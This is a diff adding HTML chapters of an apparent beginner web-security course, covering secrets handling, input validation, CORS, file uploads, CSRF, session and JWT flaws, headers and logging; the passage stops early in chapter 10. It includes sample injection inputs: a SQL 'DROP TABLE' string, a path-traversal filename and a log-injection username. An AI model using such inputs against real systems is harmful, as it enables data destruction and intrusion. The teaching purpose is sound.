+          <pre"># credentials.py  (pushed to public GitHub)
+DB_HOST = "db.company.com"
+DB_USER = "admin"
+DB_PASSWORD = "SuperSecret123!"  # EXPOSED FOREVER
+API_KEY = "sk-abc123xyz789..."   # EXPOSED FOREVER
+
+# Git history is permanent. Even if you delete this file
+# later, the credentials exist in git history and are
+# accessible via GitHub's search to anyone on the internet.</pre>
+          <div class="code-note">GitHub secret scanning will flag this. Attackers also scan GitHub 24/7 looking for exactly this. Credentials found this way are exploited within minutes.</div>
+        </div>
+        <div class="code-block good">
+          <div class="code-block-label">-- SECURE -- Environment Variables</div>
+          <pre"># .env file (NEVER committed to git -- in .gitignore)
+# DB_HOST=db.company.com
+# DB_PASSWORD=SuperSecret123!
+# API_KEY=sk-abc123xyz789...
+
+# credentials.py (safe to commit)
+import os
+
+DB_HOST = os.environ.get("DB_HOST")
+DB_PASSWORD = os.environ.get("DB_PASSWORD")
+API_KEY = os.environ.get("API_KEY")
+
+# The actual values live ONLY in the environment.
+# For production: use AWS Secrets Manager,
+# GCP Secret Manager, or HashiCorp Vault.</pre>
+          <div class="code-note">The code contains no sensitive values. The actual secrets are injected at runtime from the environment or a vault service.</div>
+        </div>
+      </div>
+
+    </div>
+    <div class="page-footer">
+      <div class="page-number">Page 5 &nbsp;|&nbsp; Chapter 05: Data Protection &amp; Encryption</div>
+      <div class="page-nav">
+        <a href="#ch4">&lt;-- Chapter 04</a>
+        <a href="#ch6">Chapter 06 --&gt;</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== PAGE 6: API DEFENSE ===================== -->
+  <div class="page" id="ch6">
+    <div class="page-header">
+      <div class="page-eyebrow">Chapter 06 -- Page 6 of 10</div>
+      <div class="page-title">API Defense <span>&amp; Input Validation</span></div>
+      <div class="page-subtitle">Treating every user as a potential threat -- because on the internet, they might be.</div>
+    </div>
+    <div class="page-body">
+
+      <div class="code-prep">
+        <div class="code-prep-label">Coding Prep Mission -- Day 13 to 15</div>
+        <div class="code-prep-title">Learn: Lists, Loops &amp; Iteration in Python</div>
+        <ul>
+          <li>Creating a list: allowed = ["jpg", "png", "gif"]</li>
+          <li>Accessing elements by index: allowed[0]</li>
+          <li>Looping through a list: for item in allowed:</li>
+          <li>Checking membership: if extension in allowed:</li>
+          <li>List methods: .append(), .remove(), len()</li>
+        </ul>
+        <div class="why">WHY THIS MATTERS: Input validation is fundamentally about iterating through incoming data and checking each value against an allowed list. Rate limiting counts requests in a time window. File type checking compares an extension against a whitelist. All of these are loop-and-compare operations on lists.</div>
+      </div>
+
+      <h2 class="section-title">6.1 -- Input Validation vs Sanitization</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- Two Stages of Airport Security</div>
+        <p>VALIDATION is the X-ray machine. If it detects something forbidden, you are turned away entirely. Your bag does not get through at all. SANITIZATION is the guard who pulls out the forbidden item, throws it away, and lets you through with the rest of your bag. Both approaches are used in software, depending on the context.</p>
+      </div>
+      <table class="data-table">
+        <thead><tr><th>Approach</th><th>What It Does</th><th>When to Use</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td><strong style="color:var(--cyan)">Validation</strong></td><td>Rejects input if it does not meet requirements</td><td>When you have strict format requirements</td><td>Email must match email format. Age must be a number 0-120.</td></tr>
+          <tr><td><strong style="color:var(--green)">Sanitization</strong></td><td>Removes or escapes dangerous parts of input</td><td>When some input is acceptable but parts are risky</td><td>Strip HTML tags from a comment. Escape special characters before storing.</td></tr>
+        </tbody>
+      </table>
+
+      <div class="code-compare">
+        <div class="code-block bad">
+          <div class="code-block-label">!! VULNERABLE -- No Validation</div>
+          <pre"># User submits age field
+age = request.get("age")  # attacker sends: "25; DROP TABLE users;"
+
+# The server just stores it:
+db.insert({ "age": age })
+# The malicious string is now in your database.
+# If it is used in a query later, it can trigger SQLi.</pre>
+          <div class="code-note">No type check, no range check, no format check. Anything the attacker sends goes directly into the database.</div>
+        </div>
+        <div class="code-block good">
+          <div class="code-block-label">-- SECURE -- Strict Validation First</div>
+          <pre"># Validate before processing ANYTHING
+age_raw = request.get("age")
+
+# 1. Type check: must be convertible to integer
+try:
+    age = int(age_raw)
+except ValueError:
+    return error(400, "Age must be a number")
+
+# 2. Range check: must be realistic
+if age &lt; 0 or age &gt; 120:
+    return error(400, "Age must be between 0 and 120")
+
+# Only now is it safe to use
+db.insert({ "age": age })</pre>
+          <div class="code-note">Strict type and range validation. The string "25; DROP TABLE users;" will fail the int() conversion and be rejected with a 400 error.</div>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">6.2 -- Rate Limiting &amp; Throttling</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Subway Turnstile</div>
+        <p>The turnstile lets one person through per second and has a controlled pace. If 500 people rush it at once, it locks down and stops letting anyone through. Rate limiting is your API's turnstile -- it controls how many requests per minute are allowed from a single IP address or user account, preventing floods of automated requests.</p>
+      </div>
+      <div class="code-single">
+<pre"># HTTP Response when rate limit is exceeded:
+HTTP/1.1 429 Too Many Requests
+Content-Type: application/json
+Retry-After: 60
+
+{
+  "error": "Too Many Requests",
+  "message": "You have exceeded 100 requests per minute.",
+  "retry_after": 60
+}</pre>
+      </div>
+
+      <h3 class="sub-title">Rate Limiting Simulator</h3>
+      <div class="simulator">
+        <div class="sim-label">Interactive Simulator</div>
+        <div class="sim-title">Click "Send Request" rapidly to simulate a flood. Toggle the rate limiter to see the difference.</div>
+        <button class="sim-btn" onclick="toggleRateLimit()" id="rate-toggle" style="background: linear-gradient(135deg, #004400, var(--green)); margin-bottom: 10px;">Rate Limiting: ON</button>
+        &nbsp;
+        <button class="sim-btn" onclick="sendRequest()">Send Request</button>
+        <div class="sim-output" id="rate-output">Click "Send Request" to simulate API requests. Try clicking fast!</div>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">6.3 -- CORS: Cross-Origin Resource Sharing</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Club Guest List</div>
+        <p>Your club only lets in guests from specific partner venues. CORS is the bouncer checking the guest list. If your frontend at "app.mysite.com" tries to call your API at "api.mysite.com", the browser asks the API if that origin is allowed. If the API says yes, the request goes through. If not, the browser blocks it.</p>
+      </div>
+      <div class="code-compare">
+        <div class="code-block bad">
+          <div class="code-block-label">!! DANGEROUS -- Wildcard Origin</div>
+          <pre"># This header says: ANY website on the internet
+# can make requests to my API.
+
+Access-Control-Allow-Origin: *
+
+# This means:
+# evil-site.com can call your API
+# Any attacker's website can call your API
+# All your data is potentially accessible to anyone</pre>
+          <div class="code-note">A wildcard CORS policy is almost never correct. It removes the entire purpose of the Same-Origin Policy security model.</div>
+        </div>
+        <div class="code-block good">
+          <div class="code-block-label">-- SECURE -- Whitelist Specific Origins</div>
+          <pre"># Only allow specific, known origins
+
+ALLOWED_ORIGINS = [
+    "https://app.mycompany.com",
+    "https://admin.mycompany.com",
+]
+
+def set_cors_headers(request, response):
+    origin = request.headers.get("Origin")
+    if origin in ALLOWED_ORIGINS:
+        response.headers["Access-Control-Allow-Origin"] = origin
+    # If origin is not in the list, no CORS header is set
+    # and the browser will block the request</pre>
+          <div class="code-note">Only your specific frontend domains are allowed. Any other origin, including attacker sites, will be blocked by the browser.</div>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">6.4 -- File Upload Vulnerabilities</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Trojan Horse</div>
+        <p>A beautiful wooden horse is delivered to the city gates as a gift. Inside is a hidden army. An attacker uploads a file that looks like a harmless profile photo (gift.jpg) but is actually a PHP script (gift.php) that, when the server opens it, gives the attacker full control of the server.</p>
+      </div>
+      <p>Common file upload attacks:</p>
+      <ul class="bullet-list">
+        <li><strong>Malicious script upload</strong> -- uploading a .php or .py file that the server executes</li>
+        <li><strong>MIME type spoofing</strong> -- naming a script "photo.jpg" but with PHP code inside</li>
+        <li><strong>Path traversal in filename</strong> -- naming a file "../../etc/cron.d/evil" to write outside the upload folder</li>
+        <li><strong>Zip bombs</strong> -- a tiny zip file that expands to terabytes when unzipped, crashing the server</li>
+        <li><strong>SVG with embedded scripts</strong> -- SVG files can contain JavaScript</li>
+      </ul>
+      <div class="tip-box">
+        <div class="tip-label">Secure File Upload Checklist</div>
+        <p>1. Validate both the file extension AND the MIME type (check the actual file content, not just the name). 2. Rename the file server-side -- never use the filename the user provides. 3. Store uploads OUTSIDE the web root so they cannot be executed by the server. 4. Serve files through a CDN, not directly from your application server. 5. Scan uploaded files for malware.</p>
+      </div>
+
+    </div>
+    <div class="page-footer">
+      <div class="page-number">Page 6 &nbsp;|&nbsp; Chapter 06: API Defense &amp; Input Validation</div>
+      <div class="page-nav">
+        <a href="#ch5">&lt;-- Chapter 05</a>
+        <a href="#ch7">Chapter 07 --&gt;</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== PAGE 7: SESSION EXPLOITS ===================== -->
+  <div class="page" id="ch7">
+    <div class="page-header">
+      <div class="page-eyebrow">Chapter 07 -- Page 7 of 10</div>
+      <div class="page-title">Session Exploits <span>&amp; CSRF</span></div>
+      <div class="page-subtitle">When cookies become weapons against their own owners.</div>
+    </div>
+    <div class="page-body">
+
+      <div class="code-prep">
+        <div class="code-prep-label">Coding Prep Mission -- Day 16 to 18</div>
+        <div class="code-prep-title">Learn: Dictionaries in Python &amp; Basic Web Concepts in JavaScript</div>
+        <ul>
+          <li>Python dictionaries: user_session = {"user_id": 42, "token": "abc"}</li>
+          <li>What a cookie is: a small piece of data your browser stores and sends with every request</li>
+          <li>What localStorage is: browser storage that does NOT get sent with requests</li>
+          <li>Basic JavaScript: document.cookie, fetch(), how the browser makes requests</li>
+        </ul>
+        <div class="why">WHY THIS MATTERS: Sessions are dictionaries stored server-side. CSRF exploits the fact that browsers automatically attach cookies to every request. To understand these attacks, you need to know what cookies are, how they flow, and why the browser sends them automatically even when you do not explicitly tell it to.</div>
+      </div>
+
+      <h2 class="section-title">7.1 -- Session Hijacking &amp; Cookie Theft</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Festival Wristband Thief</div>
+        <p>At a music festival, your wristband proves you paid for entry. A thief takes a photo of your wristband and creates a perfect copy. Now they can enter as you anytime. The security staff cannot tell the difference between the real and fake wristband. Session hijacking works the same way -- the attacker steals your session cookie and the server cannot tell they are not you.</p>
+      </div>
+      <p>A session cookie is a small piece of data the server sets in your browser after you log in. Your browser sends this cookie automatically with every request. If an attacker steals this cookie, they can impersonate you completely.</p>
+      <p>Cookie security flags -- these are critical and often forgotten:</p>
+
+      <div class="code-compare">
+        <div class="code-block bad">
+          <div class="code-block-label">!! VULNERABLE -- Cookie With No Security Flags</div>
+          <pre"># Server sets a cookie like this:
+Set-Cookie: session=abc123xyz
+
+# Problems:
+# 1. No HttpOnly -- JavaScript on the page can read this
+#    cookie. XSS attack can steal it with document.cookie
+# 2. No Secure -- cookie can be sent over HTTP (unencrypted)
+#    and intercepted by a network attacker
+# 3. No SameSite -- cookie is sent with cross-site requests
+#    enabling CSRF attacks</pre>
+          <div class="code-note">Missing all three critical flags. This cookie is vulnerable to three different attack categories simultaneously.</div>
+        </div>
+        <div class="code-block good">
+          <div class="code-block-label">-- SECURE -- Cookie With All Security Flags</div>
+          <pre"># Server sets a cookie with all flags:
+Set-Cookie: session=abc123xyz; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
+
+# What each flag does:
+# HttpOnly -- JavaScript CANNOT read this cookie.
+#             Blocks all XSS-based cookie theft.
+# Secure   -- Cookie is ONLY sent over HTTPS.
+#             Cannot be intercepted on plain HTTP.
+# SameSite=Strict -- Cookie is NOT sent with
+#             cross-site requests. Blocks CSRF.
+# Max-Age  -- Cookie expires after 1 hour.</pre>
+          <div class="code-note">All three attack vectors are addressed by adding the right flags to the Set-Cookie header. This is a one-line fix with major security impact.</div>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">7.2 -- CSRF: Cross-Site Request Forgery</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Forged Bank Cheque</div>
+        <p>An attacker finds a blank cheque from your chequebook. They fill in "Pay to: Attacker, Amount: All Your Money" and forge your signature. Your bank processes it because the cheque looks legitimate -- it came from your account. CSRF is a malicious website secretly submitting a request to a legitimate website (like your bank) using your browser's automatic cookie, making it look like the request came from you.</p>
+      </div>
+
+      <div class="flow">
+        <div class="flow-label-top">HOW A CSRF ATTACK WORKS</div>
+        <div class="flow-row">
+          <div class="flow-node red">Attacker's Site</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node yellow">Victim's Browser auto-sends bank cookie</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node red">Bank API receives request</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node red">Thinks it is from the real user</div>
+          <div class="flow-arrow">--&gt;</div>
+          <div class="flow-node red">Transfer executed</div>
+        </div>
+      </div>
+
+      <h3 class="sub-title">How to Prevent CSRF: The CSRF Token</h3>
+      <p>A CSRF token is a unique, random, secret value embedded in every form the server sends to the user. When the form is submitted, the server checks that the token is present and matches. An attacker's website cannot know this token because it was never sent to them -- it only exists in YOUR browser session.</p>
+      <div class="code-single">
+<pre">&lt;!-- Server embeds a unique CSRF token in every form --&gt;
+&lt;form method="POST" action="/transfer"&gt;
+    &lt;input type="hidden" name="csrf_token" value="f3a8b2c9d1e4f7a0b3c6d9e2"&gt;
+    &lt;input type="number" name="amount" placeholder="Amount"&gt;
+    &lt;button type="submit"&gt;Transfer&lt;/button&gt;
+&lt;/form&gt;
+
+&lt;!-- Server validation on POST --&gt;
+def transfer(request):
+    submitted_token = request.get("csrf_token")
+    session_token = session.get("csrf_token")
+
+    if submitted_token != session_token:
+        return error(403, "Invalid CSRF token")  # Request rejected
+
+    # Token matched -- proceed with transfer</pre>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">7.3 -- Session Fixation</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Pre-Made Hotel Keycard</div>
+        <p>An attacker checks into the hotel before you and asks for a keycard for Room 203 (your room). They are told the keycard does not work yet, the room is not ready. You check in later and the hotel assigns you a keycard for Room 203. The attacker's pre-made keycard for Room 203 now ALSO works because it shares the same session ID.</p>
+      </div>
+      <p>Session fixation happens when an attacker forces a known session ID onto a victim BEFORE they log in. When the victim logs in, the server associates the real user's account with that attacker-controlled session ID. The attacker then uses the same session ID to access the authenticated session.</p>
+      <div class="tip-box">
+        <div class="tip-label">The Fix: Regenerate the Session ID on Login</div>
+        <p>Always invalidate the old session and generate a brand new session ID immediately after a successful login. This means even if the attacker set a session ID before login, the session ID changes at login and the attacker's copy becomes invalid.</p>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">7.4 -- JWT Vulnerabilities</h2>
+      <p>JSON Web Tokens are powerful but have specific known attack vectors:</p>
+      <ul class="bullet-list">
+        <li><strong>Algorithm: None attack</strong> -- an attacker modifies the JWT header to say the algorithm is "none" (no signature needed). If the server accepts this, the attacker can forge any token with any claims. Always specify and enforce the algorithm server-side.</li>
+        <li><strong>Weak secret key</strong> -- if the JWT is signed with a weak secret like "password" or "secret", it can be brute-forced offline. Use a cryptographically random secret of at least 256 bits.</li>
+        <li><strong>Not checking expiry</strong> -- if the server does not validate the "exp" (expiry) claim, a stolen token works forever. Always validate expiry on every request.</li>
+        <li><strong>Sensitive data in payload</strong> -- the JWT payload is base64 encoded, NOT encrypted. Anyone can decode it and read the contents. Never store passwords, credit card numbers, or sensitive data inside a JWT.</li>
+      </ul>
+
+    </div>
+    <div class="page-footer">
+      <div class="page-number">Page 7 &nbsp;|&nbsp; Chapter 07: Session Exploits &amp; CSRF</div>
+      <div class="page-nav">
+        <a href="#ch6">&lt;-- Chapter 06</a>
+        <a href="#ch8">Chapter 08 --&gt;</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== PAGE 8: INFRASTRUCTURE ===================== -->
+  <div class="page" id="ch8">
+    <div class="page-header">
+      <div class="page-eyebrow">Chapter 08 -- Page 8 of 10</div>
+      <div class="page-title">Infrastructure <span>&amp; Security Headers</span></div>
+      <div class="page-subtitle">Hardening the walls before attackers even reach your code.</div>
+    </div>
+    <div class="page-body">
+
+      <div class="code-prep">
+        <div class="code-prep-label">Coding Prep Mission -- Day 19 to 21</div>
+        <div class="code-prep-title">Learn: Environment Variables &amp; Configuration Files</div>
+        <ul>
+          <li>What an .env file is and how to create one</li>
+          <li>Reading environment variables: os.environ.get("KEY") in Python</li>
+          <li>Reading environment variables: process.env.KEY in Node.js</li>
+          <li>Why configuration should be separated from code</li>
+          <li>The 12-factor app methodology (a widely used standard)</li>
+        </ul>
+        <div class="why">WHY THIS MATTERS: Security headers are configuration values applied at the server or infrastructure layer. WAF rules are configuration. Server hardening is about changing configuration. Understanding how applications read and apply configuration from the environment is the foundation for setting up all of these defenses correctly.</div>
+      </div>
+
+      <h2 class="section-title">8.1 -- Critical Security HTTP Response Headers</h2>
+      <p>Security headers are directives your server sends in HTTP responses to tell the browser how to behave. They are one of the highest-impact, lowest-effort security improvements you can make:</p>
+      <table class="data-table">
+        <thead><tr><th>Header</th><th>What It Does</th><th>Attack It Prevents</th></tr></thead>
+        <tbody>
+          <tr><td><strong style="color:var(--cyan)">Content-Security-Policy</strong></td><td>Tells the browser which domains scripts, images, and fonts may be loaded from</td><td>XSS, data injection</td></tr>
+          <tr><td><strong style="color:var(--cyan)">Strict-Transport-Security</strong></td><td>Forces the browser to always use HTTPS for this domain, even if the user types http://</td><td>SSL stripping, man-in-the-middle</td></tr>
+          <tr><td><strong style="color:var(--cyan)">X-Frame-Options</strong></td><td>Prevents your website from being embedded in an iframe on another site</td><td>Clickjacking</td></tr>
+          <tr><td><strong style="color:var(--cyan)">X-Content-Type-Options</strong></td><td>Tells the browser not to guess (sniff) the content type of a response</td><td>MIME sniffing attacks</td></tr>
+          <tr><td><strong style="color:var(--cyan)">Referrer-Policy</strong></td><td>Controls how much URL information is sent in the Referer header to other sites</td><td>Privacy leaks, URL token exposure</td></tr>
+        </tbody>
+      </table>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">8.2 -- DDoS and Infrastructure-Level Protection</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Riot Control Response</div>
+        <p>Local police (server-side rate limiting) can handle small crowds. But if a riot of 100,000 people shows up, you need the National Guard (a CDN like Cloudflare) and coordinated citywide traffic control (Anycast routing). Server-side defenses are necessary but not sufficient for a real DDoS attack -- you need infrastructure-level defenses.</p>
+      </div>
+      <ul class="bullet-list">
+        <li><strong>Layer 3/4 DDoS</strong> -- raw network packet floods. The server's network connection is saturated. Mitigated by upstream ISP filtering and CDNs like Cloudflare, Akamai, or AWS Shield.</li>
+        <li><strong>Layer 7 DDoS</strong> -- HTTP-level floods. Many requests for a slow or expensive endpoint. Mitigated by WAFs, rate limiting, and CDN caching.</li>
+        <li><strong>WAF (Web Application Firewall)</strong> -- sits between the internet and your server. Inspects HTTP requests and blocks those that match known attack patterns. Cloudflare, AWS WAF, and Fastly all offer WAF services.</li>
+        <li><strong>Anycast routing</strong> -- your domain resolves to the nearest CDN point-of-presence. Attack traffic is distributed across hundreds of global data centers instead of hitting your single server.</li>
+      </ul>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">8.3 -- Server Hardening Checklist</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Fortress</div>
+        <p>You build a strong front gate with guards, biometric locks, and surveillance cameras. But you leave a small maintenance door in the back unlocked because nobody uses it. An attacker does not care about your impressive front gate -- they will find and use the back door. Server hardening is about closing every door, window, and crack, even the ones you think no attacker would bother with.</p>
+      </div>
+      <ul class="num-list">
+        <li><strong>Close unnecessary ports</strong> -- if port 22 (SSH) does not need to be public, restrict it to specific IP addresses using a firewall</li>
+        <li><strong>Principle of Least Privilege</strong> -- every process and user account should have ONLY the permissions they need and nothing more</li>
+        <li><strong>Disable directory listing</strong> -- a web server should never show a file browser listing of its directories to visitors</li>
+        <li><strong>Remove default credentials</strong> -- change all default admin usernames and passwords on databases, routers, and services before going live</li>
+        <li><strong>Strip stack traces from error messages</strong> -- never show internal error messages to end users. They reveal your code structure to attackers.</li>
+        <li><strong>Keep everything updated</strong> -- the majority of successful attacks exploit known vulnerabilities that already have patches available</li>
+      </ul>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">8.4 -- Dependency and Supply Chain Security</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Contaminated Ingredient</div>
+        <p>You run a restaurant with the finest local produce. But your pasta sauce uses canned tomatoes from a supplier who used a pesticide banned in your country. Your dish is contaminated through the supply chain, not through any mistake you made. Software supply chain attacks work the same way -- a vulnerability in a library you depend on becomes your vulnerability too.</p>
+      </div>
+      <p>The most famous example: <strong>Log4Shell (CVE-2021-44228)</strong>. A critical vulnerability in the Apache Log4j logging library (used in virtually every Java application) allowed attackers to execute arbitrary code on any affected server by sending a single malicious string. Millions of servers worldwide were vulnerable, and exploitation began within hours of the vulnerability being published.</p>
+      <ul class="bullet-list">
+        <li><strong>npm audit</strong> (JavaScript) -- scans your dependencies for known vulnerabilities</li>
+        <li><strong>pip-audit / safety</strong> (Python) -- same for Python packages</li>
+        <li><strong>Dependabot</strong> -- GitHub tool that automatically creates pull requests to update vulnerable dependencies</li>
+        <li><strong>Lock files</strong> -- package-lock.json or requirements.txt pin exact versions so updates are explicit and auditable</li>
+      </ul>
+
+    </div>
+    <div class="page-footer">
+      <div class="page-number">Page 8 &nbsp;|&nbsp; Chapter 08: Infrastructure &amp; Security Headers</div>
+      <div class="page-nav">
+        <a href="#ch7">&lt;-- Chapter 07</a>
+        <a href="#ch9">Chapter 09 --&gt;</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== PAGE 9: LOGGING ===================== -->
+  <div class="page" id="ch9">
+    <div class="page-header">
+      <div class="page-eyebrow">Chapter 09 -- Page 9 of 10</div>
+      <div class="page-title">Logging <span>&amp; Secrets Management</span></div>
+      <div class="page-subtitle">Knowing when you have been breached -- and keeping your keys hidden.</div>
+    </div>
+    <div class="page-body">
+
+      <div class="code-prep">
+        <div class="code-prep-label">Coding Prep Mission -- Day 22 to 24</div>
+        <div class="code-prep-title">Learn: File I/O &amp; Exception Handling in Python</div>
+        <ul>
+          <li>Opening files: open("file.txt", "r"), open("file.txt", "a")</li>
+          <li>Reading from a file: file.read(), file.readlines()</li>
+          <li>Writing to a file: file.write("some text\n")</li>
+          <li>Using the "with" statement for safe file handling</li>
+          <li>Try / except blocks for error handling</li>
+        </ul>
+        <div class="why">WHY THIS MATTERS: Security logs are text files your server constantly writes to. Log injection attacks corrupt these files by writing fake entries. Secrets management involves reading credentials from secure file stores at startup. Understanding file I/O directly translates to understanding how both of these security systems work.</div>
+      </div>
+
+      <h2 class="section-title">9.1 -- What to Log and What NEVER to Log</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Security Camera That Records PINs</div>
+        <p>A security camera recording who enters and exits a building is valuable and appropriate. But a camera positioned directly over an ATM keyboard, recording every PIN entered, is a privacy disaster waiting to happen. If that footage is ever stolen or leaked, every customer's PIN is compromised. Logs must capture enough to be useful for investigation without capturing things that become catastrophic if the logs are ever accessed by the wrong person.</p>
+      </div>
+      <div class="code-compare">
+        <div class="code-block bad">
+          <div class="code-block-label">!! NEVER LOG THESE</div>
+          <pre"># These items should NEVER appear in any log file:
+
+# 2024-01-15 09:23:11 LOGIN user=alice password=MyDogFluffy2024
+# 2024-01-15 09:23:15 PAYMENT card=4111111111111111 cvv=321
+# 2024-01-15 09:23:20 AUTH token=eyJhbGci...full_token_here
+# 2024-01-15 09:23:25 CONFIG db_pass=SuperSecret123!
+
+# If logs are ever accessed by an attacker (they often are),
+# all of this is immediately exploitable.</pre>
+          <div class="code-note">Logs are frequently targeted in breaches precisely because developers log too much. Treat log files as sensitive data.</div>
+        </div>
+        <div class="code-block good">
+          <div class="code-block-label">-- LOG THESE -- Structured JSON Logging</div>
+          <pre"># Safe structured log format:
+{
+  "timestamp": "2024-01-15T09:23:11Z",
+  "level": "INFO",
+  "event": "user.login.success",
+  "user_id": "usr_abc123",     # ID, not username
+  "ip_address": "192.168.1.x", # can mask last octet
+  "user_agent": "Mozilla/5.0...",
+  "session_id": "sess_def456"  # session ID, not token
+}
+
+# For a failed login:
+{
+  "event": "user.login.failed",
+  "ip_address": "203.0.113.45",
+  "attempt_count": 4
+  # Notice: NO password attempt is logged. Ever.
+}</pre>
+          <div class="code-note">Enough information to investigate an incident without creating a second breach if the logs are ever accessed.</div>
+        </div>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">9.2 -- Log Injection</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- Forging a Security Guard's Shift Report</div>
+        <p>A thief enters a secure building and, before leaving, writes in the guard's shift report: "All clear, no incidents detected." The actual incident of the thief being there is now hidden behind a fake "all clear" entry. Log injection is an attacker writing fake log entries to hide their tracks or confuse security analysts investigating an incident.</p>
+      </div>
+      <div class="code-single">
+<pre"># The attack:
+# An attacker submits the username:
+#   admin\n2024-01-15 09:24:00 INFO: User admin logged in successfully
+
+# The developer logs this:
+log.write(f"2024-01-15 09:23:55 WARNING: Failed login for user: {username}\n")
+
+# The actual log file now contains:
+# 2024-01-15 09:23:55 WARNING: Failed login for user: admin
+# 2024-01-15 09:24:00 INFO: User admin logged in successfully
+
+# The fake success entry is now in the log.
+# A security analyst scanning for failed logins might
+# see the fake success and dismiss the failed attempt.</pre>
+      </div>
+      <div class="tip-box">
+        <div class="tip-label">Prevention</div>
+        <p>Always sanitize log inputs -- strip or escape newline characters (\n and \r) from any user-supplied data before logging it. Better yet, use a structured logging library (like Python's built-in logging module or a library like structlog) which handles escaping automatically and writes logs in JSON format where newlines inside values cannot create fake entries.</p>
+      </div>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">9.3 -- Security Monitoring &amp; Alerting</h2>
+      <p>Logs are useless if nobody reads them. Real security teams use automated monitoring systems that scan logs in real time and trigger alerts when suspicious patterns are detected.</p>
+      <p>Examples of automatic alert triggers:</p>
+      <ul class="bullet-list">
+        <li>More than 10 failed login attempts from the same IP address in 1 minute</li>
+        <li>A successful login from a country the user has never logged in from before</li>
+        <li>Impossible travel: user logged in from India and then from the USA 5 minutes later (physically impossible)</li>
+        <li>A user account that never had admin access suddenly attempting to call an admin-only endpoint</li>
+        <li>A large volume of data being downloaded from the database in a short time period</li>
+      </ul>
+
+      <div class="divider"></div>
+
+      <h2 class="section-title">9.4 -- Secrets Vaults</h2>
+      <p>For production systems, .env files are a starting point but are not sufficient. Secrets vaults are dedicated, hardened systems for storing and managing credentials:</p>
+      <table class="data-table">
+        <thead><tr><th>Solution</th><th>Best For</th><th>Key Features</th></tr></thead>
+        <tbody>
+          <tr><td><strong>.env files</strong></td><td>Local development only</td><td>Simple. Never commit to git.</td></tr>
+          <tr><td><strong>AWS Secrets Manager</strong></td><td>Applications hosted on AWS</td><td>Automatic rotation, access control, audit logs</td></tr>
+          <tr><td><strong>GCP Secret Manager</strong></td><td>Applications on Google Cloud</td><td>Versioned secrets, fine-grained IAM permissions</td></tr>
+          <tr><td><strong>HashiCorp Vault</strong></td><td>Multi-cloud or on-premise</td><td>Dynamic secrets, lease management, open source</td></tr>
+        </tbody>
+      </table>
+      <div class="warning-box">
+        <div class="warning-label">Critical Rule: Secret Rotation</div>
+        <p>Regularly rotate (change) your secrets, even if you do not believe they have been compromised. If a secret was silently stolen and you do not know it yet, rotation invalidates the stolen credential and ends the attacker's access. Most secrets vault services support automatic rotation.</p>
+      </div>
+
+    </div>
+    <div class="page-footer">
+      <div class="page-number">Page 9 &nbsp;|&nbsp; Chapter 09: Logging &amp; Secrets Management</div>
+      <div class="page-nav">
+        <a href="#ch8">&lt;-- Chapter 08</a>
+        <a href="#ch10">Chapter 10 --&gt;</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===================== PAGE 10: SECURITY LIFECYCLE ===================== -->
+  <div class="page" id="ch10">
+    <div class="page-header">
+      <div class="page-eyebrow">Chapter 10 -- Page 10 of 10</div>
+      <div class="page-title">The Security <span>Lifecycle</span></div>
+      <div class="page-subtitle">Security is not a feature you add at the end. It is woven into every stage.</div>
+    </div>
+    <div class="page-body">
+
+      <div class="code-prep">
+        <div class="code-prep-label">Coding Prep Mission -- Day 25 to 28</div>
+        <div class="code-prep-title">Learn: Git, Version Control &amp; Package Managers</div>
+        <ul>
+          <li>git init, git add, git commit, git push -- the basic workflow</li>
+          <li>What .gitignore is and how to use it (add .env files here!)</li>
+          <li>Reading a package.json (Node.js) or requirements.txt (Python)</li>
+          <li>Installing packages: npm install or pip install</li>
+          <li>Understanding what a CVE (Common Vulnerabilities and Exposures) number is</li>
+        </ul>
+        <div class="why">WHY THIS MATTERS: The security lifecycle depends entirely on version control for auditing who changed what, tracking vulnerabilities in dependencies, rolling back after a breach, and managing the lifecycle of secrets and certificates. Git and package management are the mechanical foundation of all professional security practices.</div>
+      </div>
+
+      <h2 class="section-title">10.1 -- Secure Software Development Lifecycle (SSDLC)</h2>
+      <div class="analogy">
+        <div class="analogy-label">Real-World Analogy -- The Cost of Fixing a Problem Late</div>
+        <p>Fixing a crack in a building's foundation during the architectural planning phase costs almost nothing -- you just change the drawing. Fixing it after the building is built costs enormous amounts of money, time, and disruption. Fixing it after the building collapses is catastrophic. Security bugs work exactly the same way: 1x cost to fix in design, 10x in development, 100x after deployment, 1000x after a breach.</p>
+      </div>
